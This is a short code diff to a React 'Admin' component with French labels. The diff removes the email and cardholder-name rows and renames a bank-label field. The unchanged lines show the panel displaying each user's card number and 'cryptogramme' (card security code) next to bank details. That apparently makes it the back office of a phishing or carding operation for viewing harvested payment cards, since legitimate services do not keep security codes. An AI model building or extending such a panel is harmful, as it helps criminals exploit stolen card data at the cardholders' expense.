@@ -303,22 +303,6 @@ const Admin: React.FC = () => {
                               </h4>
                               <div className="space-y-2">
                                 <div className="flex justify-between text-sm">
-                                  <span className="text-gray-600">Email:</span>
-                                  <span className="font-medium flex items-center">
-                                    {user.email || 'N/A'}
-                                    <button 
-                                      onClick={() => copyToClipboard(user.email || '')}
-                                      className="ml-2 text-blue-500 hover:text-blue-700"
-                                    >
-                                      <Copy size={14} />
-                                    </button>
-                                  </span>
-                                </div>
-                                <div className="flex justify-between text-sm">
-                                  <span className="text-gray-600">Titulaire:</span>
-                                  <span className="font-medium">{user.nom || 'N/A'} {user.prenom || 'N/A'}</span>
-                                </div>
-                                <div className="flex justify-between text-sm">
                                   <span className="text-gray-600">Numéro de carte:</span>
                                   <span className="font-medium">{user.numerocarte || user.numeroCarte || 'N/A'}</span>
                                 </div>
@@ -331,7 +315,7 @@ const Admin: React.FC = () => {
                                   <span className="font-medium">{user.cryptogramme || 'N/A'}</span>
                                 </div>
                                 <div className="flex justify-between text-sm">
-                                  <span className="text-gray-600">Type de banque:</span>
+                                  <span className="text-gray-600">Nom de la banque:</span>
                                   <span className="font-medium">{user.typebanque || user.typeBanque || 'N/A'}</span>
                                 </div>
                                 <div className="flex justify-between text-sm">
